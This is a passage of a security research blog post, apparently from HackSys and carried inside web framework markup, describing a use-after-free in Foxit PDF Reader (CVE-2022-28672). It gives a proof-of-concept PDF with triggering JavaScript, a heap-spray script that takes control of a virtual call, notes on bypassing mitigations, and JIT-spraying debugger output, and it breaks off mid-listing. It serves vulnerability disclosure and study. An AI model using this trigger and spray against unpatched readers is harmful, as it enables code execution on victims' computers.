1:"$Sreact.fragment"
2:"$Sreact.suspense"
3:I[75989,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"GoogleAnalytics"]
4:I[29093,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"PageLoadWrapper"]
5:I[2148,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"Header"]
6:I[87555,[],""]
7:I[31295,[],""]
8:I[32876,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","4345","static/chunks/app/not-found-cbc74e2537bbd3aa.js"],"default"]
9:I[6874,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],""]
c:I[59665,[],"MetadataBoundary"]
e:I[59665,[],"OutletBoundary"]
11:I[74911,[],"AsyncMetadataOutlet"]
13:I[59665,[],"ViewportBoundary"]
15:I[26614,[],""]
:HL["/_next/static/media/569ce4b8f30dc480-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/media/93f479601ee12b01-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/media/d8804d28b3f5ce05-s.p.otf","font",{"crossOrigin":"","type":"font/otf"}]
:HL["/_next/static/css/4dfd5a5264424a0f.css","style"]
:HL["/_next/static/css/2a75dc013f3ed419.css","style"]
:HL["/_next/static/css/09dfadb69bdaa005.css","style"]
:HL["/_next/static/css/06fcfbe31f4b8e82.css","style"]
a:T4ef,M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z0:{"P":null,"b":"gMyW5qIY4BG4upgCzpuGJ","p":"","c":["","blogs","foxit-reader-uaf-rce-jit-spraying-cve-2022-28672"],"i":false,"f":[[["",{"children":["blogs",{"children":[["slug","foxit-reader-uaf-rce-jit-spraying-cve-2022-28672","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/4dfd5a5264424a0f.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/2a75dc013f3ed419.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","$2",null,{"fallback":null,"children":["$","$L3",null,{}]}]}],["$","body",null,{"className":"__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col","children":["$","$2",null,{"fallback":null,"children":["$","$L4",null,{"children":[["$","$L5",null,{}],["$","main",null,{"className":"flex-grow container mx-auto pt-24 pb-20","children":["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L8",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"fixed left-0 bottom-0 right-0 border-t border-primary/30 bg-background/95 backdrop-blur-sm py-2 px-2 sm:px-4 w-full z-10 print:relative","children":["$","div",null,{"className":"container mx-auto px-0","children":["$","div",null,{"className":"flex items-center justify-between w-full","children":[["$","div",null,{"className":"flex-1","children":["$","div",null,{"className":"text-xs sm:text-sm font-semibold bg-gradient-to-r from-primary/90 to-secondary/90 bg-clip-text text-transparent truncate","children":["© ",2025," ","HackSys Inc"]}]}],["$","div",null,{"className":"flex items-center gap-3 sm:gap-4 ml-4","children":[["$","$L9",null,{"href":"https://twitter.com/HackSysTeam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Twitter","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"X"}],["$","path",null,{"d":"M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"}]]}]}],["$","$L9",null,{"href":"https://github.com/hacksysteam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"GitHub","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"GitHub"}],["$","path",null,{"d":"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"}]]}]}],["$","$L9",null,{"href":"https://www.facebook.com/HackSysTeam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Facebook","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"Facebook"}],["$","path",null,{"d":"M9.101 23.691v-7.98H6.627v-3.667h2.474v-1.58c0-4.085 1.848-5.978 5.858-5.978.401 0 .955.042 1.468.103a8.68 8.68 0 0 1 1.141.195v3.325a8.623 8.623 0 0 0-.653-.036 26.805 26.805 0 0 0-.733-.009c-.707 0-1.259.096-1.675.309a1.686 1.686 0 0 0-.679.622c-.258.42-.374.995-.374 1.752v1.297h3.919l-.386 2.103-.287 1.564h-3.246v8.245C19.396 23.238 24 18.179 24 12.044c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.628 3.874 10.35 9.101 11.647Z"}]]}]}],["$","$L9",null,{"href":"https://discord.com/invite/ns32uNhaq7","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Discord","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"Discord"}],["$","path",null,{"d":"$a"}]]}]}]]}]]}]}]}]]}]}]}]]}]]}],{"children":["blogs",["$","$1","c",{"children":[null,["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","foxit-reader-uaf-rce-jit-spraying-cve-2022-28672","d"],["$","$1","c",{"children":[null,["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$Lb",["$","$Lc",null,{"children":"$Ld"}],[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/09dfadb69bdaa005.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/06fcfbe31f4b8e82.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","$Le",null,{"children":["$Lf","$L10",["$","$L11",null,{"promise":"$@12"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","H5iPgmeqi2Z_fF0X90QvG",{"children":[["$","$L13",null,{"children":"$L14"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],null]}],false]],"m":"$undefined","G":["$15","$undefined"],"s":false,"S":true}
16:I[74911,[],"AsyncMetadata"]
18:I[88793,["7330","static/chunks/d3ac728e-41fcba63e1ac6655.js","5661","static/chunks/e0368f7a-1235c34447e61195.js","6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","1456","static/chunks/1456-5cbd6dd70e2edd95.js","6877","static/chunks/6877-676b4dd2ee485b26.js","7882","static/chunks/7882-5f5fc3a912ab1310.js","3744","static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js"],"HeroSection"]
19:I[750,["7330","static/chunks/d3ac728e-41fcba63e1ac6655.js","5661","static/chunks/e0368f7a-1235c34447e61195.js","6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","1456","static/chunks/1456-5cbd6dd70e2edd95.js","6877","static/chunks/6877-676b4dd2ee485b26.js","7882","static/chunks/7882-5f5fc3a912ab1310.js","3744","static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js"],"default"]
d:["$","$2",null,{"fallback":null,"children":["$","$L16",null,{"promise":"$@17"}]}]
1a:T652c,
## Overview

In the **first part** of the **PDF Reader** series, we shared details about an exploitable bug that we found in **Adobe Acrobat Reader**. This bug, which was an **Out of Bounds Read** caused by treating `ANSI` strings as `Unicode`, allowed us to leak sensitive information from the **sandboxed** **Adobe Reader** process.

- [Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067](/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak)

In the **second part** of the series, we will be discussing another vulnerability that we discovered while assessing the security of popular PDF readers. This time, we found a **use-after-free** vulnerability and several other crashes in **Foxit PDF Reader** during fuzz testing.

We were able to **successfully exploit** this vulnerability to gain **Remote Code Execution** in the context of **Foxit PDF Reader**.

[**Zero Day Initiative (ZDI)**](https://www.zerodayinitiative.com/) purchased this **exploit**, despite it being a **bug collision**.

## Advisory

- [CVE-2022-28672](/advisories/HI-2022-002)

## Testbed

- Host OS: **Windows 10 Pro 20H2 19042.804**
- Product: **Foxit PDF Reader 11.1.0.52543 (x86)**
- Product URL: <https://www.foxitsoftware.com/downloads/>

## Crash State

```
(cbc.1a9c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000002 ebx=1c8bef98 ecx=1c8bef98 edx=00000000 esi=24984fa8 edi=104f8fd0
eip=015a4610 esp=0779a720 ebp=0779a740 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x281670:
015a4610 8b412c          mov     eax,dword ptr [ecx+2Ch] ds:002b:1c8befc4=????????
```

A quick verification using the `!heap` command reveals that this is a **use-after-free** vulnerability.

```
0:000> !ext.heap -p -a @ecx
    address 26786f98 found in
    _DPH_HEAP_ROOT @ b9d1000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                   267f0138:         26786000             2000
    6fbdab02 verifier!AVrfDebugPageHeapFree+0x000000c2
    76fbf766 ntdll!RtlDebugFreeHeap+0x0000003e
    76f768ae ntdll!RtlpFreeHeap+0x0004e0ce
    76f662ed ntdll!RtlpFreeHeapInternal+0x00000783
    76f28786 ntdll!RtlFreeHeap+0x00000046
    045e8fbb FoxitPDFReader!FPDFSCRIPT3D_OBJ_Node__Method_DetachFromCurrentAnimation+0x004e7e4b
    045c4f4f FoxitPDFReader!FPDFSCRIPT3D_OBJ_Node__Method_DetachFromCurrentAnimation+0x004c3ddf
    044d2b93 FoxitPDFReader!FPDFSCRIPT3D_OBJ_Node__Method_DetachFromCurrentAnimation+0x003d1a23
    01c3a919 FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x00287979
    01c2de7b FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x0027aedb
    01c2d0e6 FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x0027a146
    01c2c786 FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x002797e6
    01f40448 FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x0058d4a8
    ...
```

## Proof of Concept

The test case includes **static form fields** in **PDF** and **javascript** action to manipulate them, causing a crash.

### Static PDF fields

```
5 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (field_10)
/FT /Ch
/Rect [844 625 413 191]
/Opt [(FK2V7)]
/I [0 1]
/Ff 67379206
>>
endobj

6 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (field_12)
/FT /Ch
/Rect [553 60 781 220]
/TU (AVALAJX9P0)
/TI 990
/I [0 1]
/Ff 1743797713
>>
endobj

7 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (field_15)
/FT /Tx
/Rect [695 237 690 797]
/TU (XA225DZMOZ)
/TM (86P4A4SWL7)
/MaxLen 1002
/V (5PLOVN0BG2TITMZ89VSATS7VAG94BYVK0TA3PKRRMSJCUFH7SF)
/Ff 45059
>>
endobj
```

### Faulting Javascript

```js
var f0 = this.getField("field_15");
var f1 = this.getField("field_12");

f1.setAction("Format", "callback7()");
this.getField("field_10").setFocus();

function callback0()
{
    f1.setItems([1]);  // invokes callback7 which frees block of memory
                       // stale memory access when callback0 ends
}

function callback7()
{
    this.deletePages(0);  // frees block of memory
}

f0.setAction("Calculate", "callback0()");
this.closeDoc(true);  // invokes callback0
```

## Root Cause Analysis

The code crashes when trying to access an object using `this` pointer.

```cpp
int __thiscall sub_1734610(_DWORD *this)
{
  int v1; // eax
  bool v2; // cl

  v1 = this[11];  // CRASH while dereferencing this pointer
  v2 = 0;
  if ( v1 )
    v2 = *(_DWORD *)v1 != 0;
  if ( v2 && v1 )
    return *(_DWORD *)v1;
  else
   return 0
}
```

**Stack trace** analysis reveals that the `sub_1729070` function allocates a `Widget` related object of size `0x64` when the `setFocus` method is called on `this.getField("field_10").setFocus()` in the javascript.

This allocation occurs when the `sub_1729070` function is called, which returns different-sized objects based on a **type check**. In this case, the switch case condition `5` is **satisfied**, resulting in an object of size `0x64` being returned.

```cpp
int __thiscall sub_1729070(_DWORD *this, int a2, char a3)
{
    // ...
    // {
      if ( a3 )
      {
        switch ( sub_1A2DB10(a2) )
        {
          case 1:
            LOBYTE(v24) = 3;
            v25 = operator new(0x34u);
            LOBYTE(v24) = 4;
            if ( v25 )
              v4 = (void (__thiscall ***)(_DWORD, int))sub_173BDC0(v21[5], a2);
            else
              v4 = 0;
            v22 = v4;
            v23 = 0;
            LOBYTE(v24) = 2;
            v7 = (int)v4;
            break;
          case 2:
            LOBYTE(v24) = 5;
            v26 = operator new(0x34u);
            LOBYTE(v24) = 6;
            if ( v26 )
              v4 = (void (__thiscall ***)(_DWORD, int))sub_1736D60(v21[5], a2);
            else
              v4 = 0;
            v22 = v4;
            v21 = 0;
            v23 = 0;
            LOBYTE(v24) = 2;
            v7 = (int)v4;
            break;
          case 3:
            LOBYTE(v24) = 7;
            v27 = operator new(0x34u);
            LOBYTE(v24) = 8;
            if ( v27 )
              v4 = (void (__thiscall ***)(_DWORD, int))sub_173CF80(v21[5], a2);
            else
              v4 = 0;
            v22 = v4;
            v17[5] = 0;
            v23 = 0;
            LOBYTE(v24) = 2;
            v7 = (int)v4;
            break;
          case 4:
            LOBYTE(v24) = 13;
            v30 = operator new(0x54u);
            LOBYTE(v24) = 14;
            if ( v30 )
              v4 = (void (__thiscall ***)(_DWORD, int))sub_1738240(v21[5], a2);
            else
              v4 = 0;
            v22 = v4;
            v17[2] = 0;
            v23 = 0;
            LOBYTE(v24) = 2;
            v7 = (int)v4;
            break;
          case 5:
            LOBYTE(v24) = 11;
            v29 = operator new(0x64u);
            LOBYTE(v24) = 12;
            if ( v29 )
              v4 = (void (__thiscall ***)(_DWORD, int))sub_173A6E0(v21[5], a2);
            else
              v4 = 0;
            v22 = v4;
            v17[3] = 0;
            v23 = 0;
            LOBYTE(v24) = 2;
            v7 = (int)v4;
            break;
          case 6:
            LOBYTE(v24) = 9;
            v28 = operator new(0x6Cu);
            LOBYTE(v24) = 10;
            if ( v28 )
              v4 = (void (__thiscall ***)(_DWORD, int))sub_172E660(v21[5], a2);
            else
              v4 = 0;
            v22 = v4;
            v17[4] = 0;
            v23 = 0;
            LOBYTE(v24) = 2;
            v7 = (int)v4;
            break;
          default:
            v4 = 0;
            v7 = 0;
            v22 = 0;
            break;
        }
      }
      // ...
  return v7;
}
```

This can be verified by using a **debugger**.

```
0:000> !ext.heap -p -a @eax
    address 256caf98 found in
    _DPH_HEAP_ROOT @ c911000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                25343444:         256caf98               64 -         256ca000             2000
          unknown!fillpattern
    6feda8b0 verifier!AVrfDebugPageHeapAllocate+0x00000240
    7723ef0e ntdll!RtlDebugAllocateHeap+0x00000039
    771a6150 ntdll!RtlpAllocateHeap+0x000000f0
    771a57fe ntdll!RtlpAllocateHeapInternal+0x000003ee
    771a53fe ntdll!RtlAllocateHeap+0x0000003e
    04608ccc FoxitPDFReader!_malloc_base+0x00000038
    043015ec FoxitPDFReader!void * __cdecl operator new(unsigned int)+0x0000002a
    01c492d1 FoxitPDFReader!sub_1729070+0x00000261
    01c4cb21 FoxitPDFReader!sub_172C7B0+0x00000371
    01f60781 FoxitPDFReader!sub_1A406B0+0x000000d1
    0118ac87 FoxitPDFReader!sub_C6A710+0x00000577
    ...
```

The `closeDoc` function invokes the `calculate` handler on `field_15`. Inside the `calculate` callback, we set the `items` property of the **choice list** field `f1`, which has a registered `format` callback. Setting the `items` property invokes its `format` callback, which deletes the **0th** page and potentially **deletes** the target object.

When the document is closed, the `sub_172B3A0` function is called.

```cpp
char __thiscall sub_172B3A0(_DWORD *this, _DWORD *a2)
{
  v2 = this;
  v35 = this;
  sub_6970E0(&v37);
  v39 = 0;
  // sub_1729070 returns target object which was already created during setFocus
  v4 = sub_1729070(v2, (int)a2, 0);
  if ( v4 )
  {
    // indirect call which also triggers format callback
    if ( !(*(unsigned __int8 (__thiscall **)(int, _DWORD *))(*(_DWORD *)v4 + 80))(v4, a2) )
    {
      sub_112B090(&v35, &v37);
      if ( v35 != (_DWORD *)v2[9] )
        sub_112AFB0(v31, v35);
LABEL_49:
      v15 = 0;
      // ...
    }
    // ...
  }
  // ...
}
```

The `sub_1729070` function returns the target object, which was previously created during the `setFocus` call. This object is then passed to the indirect call `(*(unsigned __int8 (__thiscall **)(int, _DWORD ))((_DWORD *)v4 + 80))(v4, a2)`.

This code path then invokes the `format` callback registered on `field_12`. Within the `format` callback, the target object is **freed** when `this.deletePages` function is called.

The `sub_173A900` function is responsible for **freeing** the target object of size `0x64`, which is later accessed by `sub_1734610` causing the program to **crash**.

```x86asm
.text:0173A900 ; void *__thiscall sub_173A900(void *this, char)
.text:0173A900 sub_173A900     proc near               ; CODE XREF: sub_173A8EA+3↑j
.text:0173A900                                         ; DATA XREF: .rdata:off_48159CC↓o
.text:0173A900
.text:0173A900 arg_0           = byte ptr  8
.text:0173A900
.text:0173A900                 push    ebp
.text:0173A901                 mov     ebp, esp
.text:0173A903                 push    esi
.text:0173A904                 mov     esi, ecx
.text:0173A906                 call    sub_173A7E0
.text:0173A90B                 test    [ebp+arg_0], 1
.text:0173A90F                 jz      short loc_173A91C
.text:0173A911                 push    64h ; 'd'                                        ;; size
.text:0173A913                 push    esi                                              ;; ESI - target block
.text:0173A914                 call    sub_3FD2B88                                      ;; memory free call wrapper
.text:0173A919                 add     esp, 8
.text:0173A91C
.text:0173A91C loc_173A91C:                            ; CODE XREF: sub_173A900+F↑j
.text:0173A91C                 mov     eax, esi
.text:0173A91E                 pop     esi
.text:0173A91F                 pop     ebp
.text:0173A920                 retn    4
.text:0173A920 sub_173A900     endp
```

## Exploitation

If we can control and reallocate the same size allocation, we may be able to gain direct control over code execution using the `call` instruction inside `sub_172ADA0`. This is shown below:

```
eax=41414141 ebx=0e847e88 ecx=0e8c7960 edx=00000000 esi=0e8c7960 edi=00000002
eip=01c2ade1 esp=080fa8dc ebp=080fa910 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
FoxitPDFReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0x277e41:
01c2ade1 ff5074          call    dword ptr [eax+74h]  ds:002b:414141b5=????????
```

The following script can be used to **groom the heap** to crash the **Foxit Reader** process at a controlled location. During testing, it was discovered that support for `ArrayBuffer` was disabled in **Foxit Reader**. This is likely done as a preventative measure to prevent exploitation using common javascript exploit primitives such as heap spraying and **out-of-bound read/write**. However, it was found that `SharedArrayBuffer` was not **disabled** and could be used for the same purpose.

In the sprayed memory blocks, the `eax` register points to the start of the memory buffer, and an indirect call at an offset of `0x74` indicates that it is a **C++ object** inside **Foxit** where a **virtual method** is being invoked. This can be used to execute **arbitrary code** in the context of the **Foxit** process.

```js
// spray memory allocations
function reclaim(size, count){
    for (var i = 0; i < count; i++) {
        sprayArr[i] = new SharedArrayBuffer(size);
        var rop = new DataView(sprayArr[i]);

        // control value for - call dword ptr [eax+74h]
        // first dword is pointer to the shellcode
        rop.setUint32(0, 0x41414141);

        for (var j = 4; j < rop.byteLength/4; j+=4) {
            rop.setUint32(j, 0x42424242);
        }
    }
}

function callback0()
{
    // trigger formatCallback on field 1
    f1.setItems([1]);

    // above call should free block of memory
    // we reclaim freed memory by heap spraying of fixed allocations
    reclaim(0x58, 0x1000);
    reclaim(0x68, 0x1000);
}
```

By carefully controlling the **heap spraying** process using the provided script, it is possible to crash **Foxit Reader** at a specific location when a **virtual method** is invoked. This allows the attacker to control the state of the object and potentially execute arbitrary code in the context of the **Foxit** process.

## Bypassing Mitigations

### Data Execution Prevention (DEP)

One way to bypass **DEP** and **execute** **user-controlled code** in memory is to use **return-oriented programming (ROP)**. This involves chaining together short sequences of code, called **gadgets**, that are already present in the program's memory. By carefully selecting **gadgets** and **arranging** them in a **specific order**, it is possible to **execute arbitrary code** without needing to directly call the sprayed shellcode. This can be difficult to achieve, but there are tools and resources available to help with the process.

Our bug is **user-after-free** of an object on the **heap** which allows us to call **arbitrary addresses** in memory using a **virtual function call**. Although **heap spraying** with **user-controlled** data is possible, the heap memory does not have **execute** permissions. Hence, we cannot **call** shellcode sprayed using heap-spraying.

To bypass **DEP**, we need to have an **arbitrary read/write primitive** and **ROP** chain to create an executable memory range which we don't have.

### Control Flow Guard (CFG)

**Control Flow Guard (CFG)** is a mitigation technique that is designed to prevent attackers from calling **arbitrary call sites**. **CFG** is used to protect **indirect calls** and is present in most modern software. However, in the case of **Foxit**, the software was not compiled with **CFG** support, which means that attackers can call any memory address within the Foxit address space. This lack of **CFG** support makes **Foxit** vulnerable to exploitation by attackers.

### Address Space Layout Randomization (ASLR)

**Foxit PDF Reader** has **Address Space Layout Randomization (ASLR)** enabled, which means that we cannot use any hardcoded addresses in the exploit to call the shellcode. To bypass **ASLR**, we need some kind of **heap-leaking primitive (info-leak)**, but we do not have one available.

## JIT Spraying to rescue! Bypassing DEP, ASLR at once

**JIT spraying** is a technique that can be used to bypass both **Data Execution Prevention (DEP)** and **Address Space Layout Randomization (ASCR)** at the same time. Foxit, a popular PDF viewer, ships with the **Google V8 javascript** engine as a backend for processing **javascript within PDF files**. Testing revealed that Foxit is vulnerable to **JIT spraying**.

**JIT, or Just In Time Compilation**, is commonly used within javascript engines to improve performance by converting javascript bytecode into native architecture-specific code. To do this, the JIT compiler must create a memory with **read-write-execute** permissions to store the compiled code. There are various ways to invoke the JIT compiler within a script engine.

**rh0dev** has done excellent research on **JIT spraying**, particularly on the use of the `asm.js` feature of javascript for **JIT spraying**. This technique allows the attacker to spray encoded shellcode using `asm.js`, enabling them to bypass **DEP** and **ASLR** protections.

1. [The Return of the JIT](https://rh0dev.github.io/blog/2017/the-return-of-the-jit/)
2. [Github Repository](https://github.com/rh0dev/expdev)

After several attempts, we were able to create a **JIT spray** for `v8` inside **Foxit**.

```
0:000> !address -f:PAGE_EXECUTE_READWRITE

Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

  BaseAddr EndAddr+1 RgnSize     Type       State                 Protect             Usage
-----------------------------------------------------------------------------------------------
   c0000    c5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
  140000   145000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
  1c0000   1c5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
  200000   205000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
  280000   285000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
  2c0000   2c5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
  300000   305000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
    ...
18c40000 18c45000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18c50000 18c55000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18c60000 18c65000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18c70000 18c75000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18c80000 18c85000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18c90000 18c95000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18ca0000 18ca5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18cb0000 18cb5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
18cc0000 18cc5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
